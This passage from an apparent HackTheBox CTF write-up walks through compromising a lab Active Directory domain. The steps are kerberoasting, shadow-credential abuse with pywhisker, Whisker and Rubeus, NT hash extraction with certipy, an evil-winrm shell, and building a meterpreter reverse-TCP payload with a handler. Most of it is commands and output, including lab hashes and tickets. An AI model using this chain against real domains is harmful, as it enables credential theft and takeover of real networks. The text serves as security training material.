      comment: ''
      type: Disk
    NETLOGON:
      comment: Logon server share
      type: Disk
    SYSVOL:
      comment: Logon server share
      type: Disk[0m
    [94m[*] Testing share ADMIN$[0m
    [92m[+] Mapping: DENIED, Listing: N/A[0m
    [94m[*] Testing share C$[0m
    [92m[+] Mapping: DENIED, Listing: N/A[0m
    [94m[*] Testing share IPC$[0m
    [92m[+] Mapping: OK, Listing: NOT SUPPORTED[0m
    [94m[*] Testing share IT[0m
    [91m[-] Could not check share: timed out[0m
    [94m[*] Testing share NETLOGON[0m
    [91m[-] Could not check share: timed out[0m
    [94m[*] Testing share SYSVOL[0m
    [92m[+] Mapping: OK, Listing: OK[0m
    
     =======================================
    |    Policies via RPC for fluffy.htb    |
     =======================================
    [94m[*] Trying port 445/tcp[0m
    [92m[+] Found policy:
    Domain password information:
      Password history length: 24
      Minimum password length: 7
      Maximum password age: 41 days 23 hours 53 minutes
      Password properties:
      - DOMAIN_PASSWORD_COMPLEX: false
      - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
      - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
      - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
      - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
      - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
    Domain lockout information:
      Lockout observation window: 10 minutes
      Lockout duration: 10 minutes
      Lockout threshold: None
    Domain logoff information:
      Force logoff time: not set[0m
    
     =======================================
    |    Printers via RPC for fluffy.htb    |
     =======================================
    [92m[+] No printers available[0m
    
    Completed after 85.06 seconds


Using our victim, we can try a kerberoast attack with this user. Had I useed BloodyAD or bloodhound-python, I might have found these commands natively in the output; but that's the benefit of future me writing for past me. Next time I'll take better notes.

I don't think I used these though, instead I will do another method to get remote access.

```sh
targetedKerberoast   main  python targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p prometheusx-303                                                                                                                        [*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$6f0f3e73745a6e<snip>c095
[+] Printing hash for (ldap_svc)
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$5ed5efd97d<snip>a599
[+] Printing hash for (winrm_svc)
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$ad82acf6<snip>d0a8

p.agila has GenericWrite to Service Accounts, and I can just add that account to this group to do things.


```python
!net rpc group addmem "Service Accounts" "p.agila" -U "fluffy"/"p.agila"%"prometheusx-303" -S "fluffy.htb"
```

    Can't load /etc/samba/smb.conf - run testparm to debug it



```python
!net rpc group members "Service Accounts" -U "fluffy"/"p.agila"%"prometheusx-303" -S "fluffy.htb"
```

    Can't load /etc/samba/smb.conf - run testparm to debug it
    FLUFFY\ca_svc
    FLUFFY\ldap_svc
    FLUFFY\p.agila
    FLUFFY\winrm_svc


With our new service account access, we can generate auth certificates as our victim service to to create a ticket we can use for authentication later.

```sh
pywhisker/pywhisker   main  python pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "WINRM_SVC" --action "add" -v
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d85055f2-00ec-d631-58da-b8cb56a90728
[*] Updating the msDS-KeyCredentialLink attribute of WINRM_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: XXfR2x0V
[VERBOSE] No pass was provided. The certificate will be stored with the password: 9MEM28pt6DiFHLbQK7qs
[*] Converting PEM -> PFX with cryptography: XXfR2x0V.pfx
[+] PFX exportiert nach: XXfR2x0V.pfx
[i] Passwort für PFX: 9MEM28pt6DiFHLbQK7qs
[+] Saved PFX (#PKCS12) certificate & key at path: XXfR2x0V.pfx
[*] Must be used with password: 9MEM28pt6DiFHLbQK7qs
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[VERBOSE] Run the following command to obtain a TGT
[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx XXfR2x0V.pfx -pfx-pass 9MEM28pt6DiFHLbQK7qs fluffy.htb/WINRM_SVC XXfR2x0V.ccache

```sh
[nix-shell:~/ctf/htb/season8/fluffy/pywhisker/pywhisker]$ python3 PKINITtools/gettgtpkinit.py -cert-pfx XXfR2x0V.pfx -pfx-pass 9MEM28pt6DiFHLbQK7qs fluffy.htb/WINRM_SVC XXfR2x0V.ccache
2025-05-26 04:46:30,948 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-26 04:46:30,964 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-26 04:46:41,701 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-26 04:46:41,701 minikerberos INFO     27422bc81fceaf1db94fd83d9b45c04422b14d370229d9d834aaa59646e71fde
INFO:minikerberos:27422bc81fceaf1db94fd83d9b45c04422b14d370229d9d834aaa59646e71fde
2025-05-26 04:46:41,709 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
(.venv)

Using our ticket, we can now auth with the ticket to get our NTLM hash

```sh
pywhisker/pywhisker   main  certipy cert -export -pfx XXfR2x0V.pfx -password 9MEM28pt6DiFHLbQK7qs -out unprotected.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'unprotected.pfx'
pywhisker/pywhisker   main  certipy auth -pfx unprotected.pfx -dc-ip 10.129.167.185 -username winrm_svc -domain fluffy.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767

And using our NTLM hash, we can authenticate as our user.

```sh
pywhisker/pywhisker   main  evil-winrm -i fluffy.htb -H 33bd09dcd697600edf6b3a7af4875767 -u winrm_svc

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
ls
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025  12:38 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
b8012a8f64a141d3a712f9e7699b1bce


```python
source = source[0]
!msfvenom -p windows/meterpreter/reverse_tcp LHOST=$source LPORT=4444 -f exe -o shell.exe
```

    Source locally installed gems is ignoring #<Bundler::StubSpecification name=rbs version=3.4.0 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=racc version=1.7.3 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=debug version=1.9.2 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=rbs version=3.4.0 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=racc version=1.7.3 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=debug version=1.9.2 platform=ruby> because it is missing extensions
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    No encoder specified, outputting raw payload
    Payload size: 354 bytes
    Final size of exe file: 73802 bytes
    Saved as: shell.exe


```sh
: msfconsole

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 10.10.14.28
lhost => 10.10.14.28
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.28:4444 
```
# Rabbit Holes with some good exfil of ca_svc hash

I didn't really understand certificate manager powers at the time of this challenge, and it's now been a month since I did this. But below is some documentation I used at the time to educate myself:

[https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/](https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/)  
[Precompiled windows exploit bins, maybe not the safest thing to use.](https://github.com/jakobfriedl/precompiled-binaries)

I found that using these binaries on the remote system made life a lot easier as ccaches are already natively loaded, and access to the RPC is unfettered. I have to assume this is also a lot noisier than the remote tools and should practice those more.

But using whisker we're going to do the same attack as above, but get the credentials loaded for ca_svc this time. ca_svc doesn't have remote access to the machine, so we'll need to use them on the server this time.

```sh
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> upload Whisker.exe
                                        
Info: Uploading /home/tokugero/ctf/htb/season8/week2-fluffy/Whisker.exe to C:\Users\winrm_svc\Documents\Whisker.exe
                                        
Data: 59392 bytes of 59392 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./Whisker.exe add /target:ca_svc
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password Xv5kPOhy57oYpl41
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID df3c9c61-6788-419c-a658-ca8d6cbfb24e
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Run Rubeus.exe asktgt /user:ca_svc /certificate:MIIJ<snip>lIsfFAgIH0A== /password:"Xv5kPOhy57oYpl41" /domain:fluffy.htb /dc:DC01.fluffy.htb /getcredentials /show

*Evil-WinRM* PS C:\Users\winrm_svc\Documents> upload Rubeus.exe
                                        
Info: Uploading /home/tokugero/ctf/htb/season8/week2-fluffy/Rubeus.exe to C:\Users\winrm_svc\Documents\Rubeus.exe
                                        
Data: 664916 bytes of 664916 bytes copied
                                        
Info: Upload successful!
```
Rubeus is a really great tool for managing client authentication for other tools. 

```sh
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./Rubeus.exe asktgt /user:ca_svc /certificate:MIIJ<snip>lIsfFAgIH0A== /password:"Xv5kPOhy57oYpl41" /domain:fluffy.htb /dc:DC01.fluffy.htb /getcredentials /show


   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ca_svc
[*] Building AS-REQ (w/ PKINIT preauth) for: 'fluffy.htb\ca_svc'
[*] Using domain controller: fe80::f197:7aac:42e4:bfd2%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      Zmx1ZmZ5Lmh0Yg==

  ServiceName              :  krbtgt/fluffy.htb
  ServiceRealm             :  FLUFFY.HTB
  UserName                 :  ca_svc (NT_PRINCIPAL)
  UserRealm                :  FLUFFY.HTB
  StartTime                :  5/26/2025 6:28:41 PM
  EndTime                  :  5/27/2025 4:28:41 AM
  RenewTill                :  6/2/2025 6:28:41 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  zJC9gR+wYNB3G4+p0Qe50Q==
  ASREP (key)              :  5007B281FD2F4BD89B24C673503A5471

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : CA0F4F9E9EB8A092ADDF53BB03FC98C8

```sh
/opt/venv/bin # cat /currentdir/ca_svc\ ticket | base64 -d >> ca.kirbi
/opt/venv/bin # python ticket
ticketConverter.py  ticketer.py
/opt/venv/bin # python ticketConverter.py ca.kirbi /currentdir/ca.ccache
Impacket v0.13.0.dev0+20250109.91705.ac02e0e - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

We need to have this result as a ccache specifically to conform with our other local tools. With this we can do the same attack AGAIN to get the NTLM hash for ca_svc and start using that against endpoints that aren't directly logging in.


```python
!enum4linux-ng -H CA0F4F9E9EB8A092ADDF53BB03FC98C8 -u ca_svc fluffy.htb
```

    [92mENUM4LINUX - next generation (v1.3.4)[0m
    
     ==========================
    |    Target Information    |
     ==========================
    [94m[*] Target ........... fluffy.htb[0m
    [94m[*] Username ......... 'ca_svc'[0m
    [94m[*] Random Username .. 'qtvsqbzz'[0m
    [94m[*] Password ......... ''[0m
    [94m[*] Timeout .......... 5 second(s)[0m
    
     ===================================
    |    Listener Scan on fluffy.htb    |
     ===================================
    [94m[*] Checking LDAP[0m
    [92m[+] LDAP is accessible on 389/tcp[0m
    [94m[*] Checking LDAPS[0m
    [92m[+] LDAPS is accessible on 636/tcp[0m
    [94m[*] Checking SMB[0m
    [92m[+] SMB is accessible on 445/tcp[0m
    [94m[*] Checking SMB over NetBIOS[0m
    [92m[+] SMB over NetBIOS is accessible on 139/tcp[0m
    
     ==================================================
    |    Domain Information via LDAP for fluffy.htb    |
     ==================================================
    [94m[*] Trying LDAP[0m
    [92m[+] Appears to be root/parent DC[0m
    [92m[+] Long domain name is: fluffy.htb[0m
    
     =========================================================
    |    NetBIOS Names and Workgroup/Domain for fluffy.htb    |
     =========================================================
    [91m[-] Could not get NetBIOS names information via 'nmblookup': timed out[0m
    
     =======================================
    |    SMB Dialect Check on fluffy.htb    |
     =======================================
    [94m[*] Trying on 445/tcp[0m
    [92m[+] Supported dialects and settings:
    Supported dialects:
      SMB 1.0: false
      SMB 2.02: true
      SMB 2.1: true
      SMB 3.0: true
      SMB 3.1.1: true
    Preferred dialect: SMB 3.0
    SMB1 only: false
    SMB signing required: true[0m
    
     =========================================================
    |    Domain Information via SMB session for fluffy.htb    |
     =========================================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found domain information via SMB
    NetBIOS computer name: DC01
    NetBIOS domain name: FLUFFY
    DNS domain: fluffy.htb
    FQDN: DC01.fluffy.htb
    Derived membership: domain member
    Derived domain: FLUFFY[0m
    
     =======================================
    |    RPC Session Check on fluffy.htb    |
     =======================================
    [94m[*] Check for null session[0m
    [92m[+] Server allows session using username '', password ''[0m
    [94m[*] Check for NT hash session[0m
    [92m[+] Server allows NT hash session using 'CA0F4F9E9EB8A092ADDF53BB03FC98C8'[0m
    [94m[*] Check for random user[0m
    [92m[+] Server allows session using username 'qtvsqbzz', password ''[0m
    [92m[H] Rerunning enumeration with user 'qtvsqbzz' might give more results[0m
    
     =================================================
    |    Domain Information via RPC for fluffy.htb    |
     =================================================
    [92m[+] Domain: FLUFFY[0m
    [92m[+] Domain SID: S-1-5-21-497550768-2797716248-2627064577[0m
    [92m[+] Membership: domain member[0m
    
     =============================================
    |    OS Information via RPC for fluffy.htb    |
     =============================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found OS information via SMB[0m
    [94m[*] Enumerating via 'srvinfo'[0m
    [92m[+] Found OS information via 'srvinfo'[0m
    [92m[+] After merging OS information we have the following result:
    OS: Windows 10, Windows Server 2019, Windows Server 2016
    OS version: '10.0'
    OS release: '1809'
    OS build: '17763'
    Native OS: not supported
    Native LAN manager: not supported
    Platform id: '500'
    Server type: '0x80102b'
    Server type string: Wk Sv PDC Tim NT[0m
    
     ===================================
    |    Users via RPC on fluffy.htb    |
     ===================================
    [94m[*] Enumerating users via 'querydispinfo'[0m
    [92m[+] Found 9 user(s) via 'querydispinfo'[0m
    [94m[*] Enumerating users via 'enumdomusers'[0m
    [92m[+] Found 9 user(s) via 'enumdomusers'[0m
    [92m[+] After merging user results we have 9 user(s) total:
    '1103':
      username: ca_svc
      name: certificate authority service
      acb: '0x00000210'
      description: (null)
    '1104':
      username: ldap_svc
      name: ldap service
      acb: '0x00000210'
      description: (null)
    '1601':
      username: p.agila
      name: Prometheus Agila
      acb: '0x00000210'
      description: (null)
    '1603':
      username: winrm_svc
      name: winrm service
      acb: '0x00000210'
      description: (null)
    '1605':
      username: j.coffey
      name: John Coffey
      acb: '0x00000210'
      description: (null)
    '1606':
      username: j.fleischman
      name: Joel Fleischman
      acb: '0x00000210'
      description: (null)
    '500':
      username: Administrator
      name: (null)
      acb: '0x00000210'
      description: Built-in account for administering the computer/domain
    '501':
      username: Guest
      name: (null)
      acb: '0x00000214'
      description: Built-in account for guest access to the computer/domain
    '502':
      username: krbtgt
      name: (null)
      acb: '0x00000011'
      description: Key Distribution Center Service Account[0m
    
     ====================================
    |    Groups via RPC on fluffy.htb    |
     ====================================
    [94m[*] Enumerating local groups[0m
    [92m[+] Found 5 group(s) via 'enumalsgroups domain'[0m
    [94m[*] Enumerating builtin groups[0m
    [92m[+] Found 28 group(s) via 'enumalsgroups builtin'[0m
    [94m[*] Enumerating domain groups[0m
    [92m[+] Found 17 group(s) via 'enumdomgroups'[0m
    [92m[+] After merging groups results we have 50 group(s) total:
    '1101':
      groupname: DnsAdmins
      type: local
    '1102':
      groupname: DnsUpdateProxy
      type: domain
    '1604':
      groupname: Service Account Managers
      type: domain
    '1607':
      groupname: Service Accounts
      type: domain
    '498':
      groupname: Enterprise Read-only Domain Controllers
      type: domain
    '512':
      groupname: Domain Admins
      type: domain
    '513':
      groupname: Domain Users
      type: domain
    '514':
      groupname: Domain Guests
      type: domain
    '515':
      groupname: Domain Computers
      type: domain
    '516':
      groupname: Domain Controllers
      type: domain
    '517':
      groupname: Cert Publishers
      type: local
    '518':
      groupname: Schema Admins
      type: domain
    '519':
      groupname: Enterprise Admins
      type: domain
    '520':
      groupname: Group Policy Creator Owners
      type: domain
    '521':
      groupname: Read-only Domain Controllers
      type: domain
    '522':
      groupname: Cloneable Domain Controllers
      type: domain
    '525':
      groupname: Protected Users
      type: domain
    '526':
      groupname: Key Admins
      type: domain
    '527':
      groupname: Enterprise Key Admins
      type: domain
    '544':
      groupname: Administrators
      type: builtin
    '545':
      groupname: Users
      type: builtin
    '546':
      groupname: Guests
      type: builtin
    '548':
      groupname: Account Operators
      type: builtin
    '549':
      groupname: Server Operators
      type: builtin
    '550':
      groupname: Print Operators
      type: builtin
    '551':
      groupname: Backup Operators
      type: builtin
    '552':
      groupname: Replicator
      type: builtin
    '553':
      groupname: RAS and IAS Servers
      type: local
    '554':
      groupname: Pre-Windows 2000 Compatible Access
      type: builtin
    '555':
      groupname: Remote Desktop Users
      type: builtin
    '556':
      groupname: Network Configuration Operators
      type: builtin
    '557':
      groupname: Incoming Forest Trust Builders
      type: builtin
    '558':
      groupname: Performance Monitor Users
      type: builtin
    '559':
      groupname: Performance Log Users
      type: builtin
    '560':
      groupname: Windows Authorization Access Group
      type: builtin
    '561':
      groupname: Terminal Server License Servers
      type: builtin
    '562':
      groupname: Distributed COM Users
      type: builtin
    '568':
      groupname: IIS_IUSRS
      type: builtin
    '569':
      groupname: Cryptographic Operators
      type: builtin
    '571':
      groupname: Allowed RODC Password Replication Group
      type: local
    '572':
      groupname: Denied RODC Password Replication Group
      type: local
    '573':
      groupname: Event Log Readers
      type: builtin
    '574':
      groupname: Certificate Service DCOM Access
      type: builtin
    '575':
      groupname: RDS Remote Access Servers
      type: builtin
    '576':
      groupname: RDS Endpoint Servers
      type: builtin
    '577':
      groupname: RDS Management Servers
      type: builtin
    '578':
      groupname: Hyper-V Administrators
      type: builtin
    '579':
      groupname: Access Control Assistance Operators
      type: builtin
    '580':
      groupname: Remote Management Users
      type: builtin
    '582':
      groupname: Storage Replica Administrators
      type: builtin[0m
    
     ====================================
    |    Shares via RPC on fluffy.htb    |
     ====================================
    [94m[*] Enumerating shares[0m
    [92m[+] Found 6 share(s):
    ADMIN$:
      comment: Remote Admin
      type: Disk
    C$:
      comment: Default share
      type: Disk
    IPC$:
      comment: Remote IPC
      type: IPC
    IT:
      comment: ''
      type: Disk
    NETLOGON:
      comment: Logon server share
      type: Disk
    SYSVOL:
      comment: Logon server share
      type: Disk[0m
    [94m[*] Testing share ADMIN$[0m
    [92m[+] Mapping: DENIED, Listing: N/A[0m
    [94m[*] Testing share C$[0m
    [92m[+] Mapping: DENIED, Listing: N/A[0m
    [94m[*] Testing share IPC$[0m
    [92m[+] Mapping: OK, Listing: NOT SUPPORTED[0m
    [94m[*] Testing share IT[0m
    [92m[+] Mapping: OK, Listing: DENIED[0m
    [94m[*] Testing share NETLOGON[0m
    [92m[+] Mapping: OK, Listing: OK[0m
    [94m[*] Testing share SYSVOL[0m
    [92m[+] Mapping: OK, Listing: OK[0m
    
     =======================================
    |    Policies via RPC for fluffy.htb    |
     =======================================
    [94m[*] Trying port 445/tcp[0m
    [92m[+] Found policy:
    Domain password information:
      Password history length: 24
      Minimum password length: 7
      Maximum password age: 41 days 23 hours 53 minutes
      Password properties:
      - DOMAIN_PASSWORD_COMPLEX: false
      - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
      - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
      - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
      - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
      - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
    Domain lockout information:
      Lockout observation window: 10 minutes
      Lockout duration: 10 minutes
      Lockout threshold: None
    Domain logoff information:
      Force logoff time: not set[0m
    
     =======================================
    |    Printers via RPC for fluffy.htb    |
     =======================================
    [92m[+] No printers available[0m
    
    Completed after 33.94 seconds


Again, because we dont' have remote access, some of these we need to do locally.

```sh
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./Rubeus.exe ptt /ticket:ca_svc.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Import Ticket
[+] Ticket successfully imported!

*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./Rubeus.exe klist

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0xa7b61

  UserName                 : winrm_svc
  Domain                   : FLUFFY
  LogonId                  : 0xa7b61
  UserSID                  : S-1-5-21-497550768-2797716248-2627064577-1603
  AuthenticationPackage    : NTLM
  LogonType                : Network
  LogonTime                : 5/26/2025 5:47:41 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : fluffy.htb
  UserPrincipalName        : winrm_svc@fluffy.htb

    [0] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 5/26/2025 6:28:41 PM ; 5/27/2025 4:28:41 AM ; 6/2/2025 6:28:41 PM
      Server Name       : krbtgt/fluffy.htb @ FLUFFY.HTB
      Client Name       : ca_svc @ FLUFFY.HTB
      Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)

C:\Users\winrm_svc\Documents>klist
klist

Current LogonId is 0:0xa7b61

Cached Tickets: (1)

#0>     Client: ca_svc @ FLUFFY.HTB
        Server: krbtgt/fluffy.htb @ FLUFFY.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 5/26/2025 18:28:41 (local)
        End Time:   5/27/2025 4:28:41 (local)
        Renew Time: 6/2/2025 18:28:41 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: 

# Final Steps of Certipy escalation

## More BloodHound and suggestions
https://seriotonctf.github.io/2024/06/26/ADCS-Attacks-with-Certipy/index.html

https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage


```python
!certipy find -u ca_svc -hashes :CA0F4F9E9EB8A092ADDF53BB03FC98C8 -target-ip $target
```

    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Finding certificate templates
    [*] Found 33 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 11 enabled certificate templates
    [*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
    [!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
    [*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
    [!] Failed to connect to remote registry. Service should be starting now. Trying again...
    [*] Got CA configuration for 'fluffy-DC01-CA'
    [*] Saved BloodHound data to '20250526162142_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
    [*] Saved text output to '20250526162142_Certipy.txt'
    [*] Saved JSON output to '20250526162142_Certipy.json'



```python
!cat 20250526162142_Certipy.txt | grep Template
```

    Certificate Templates
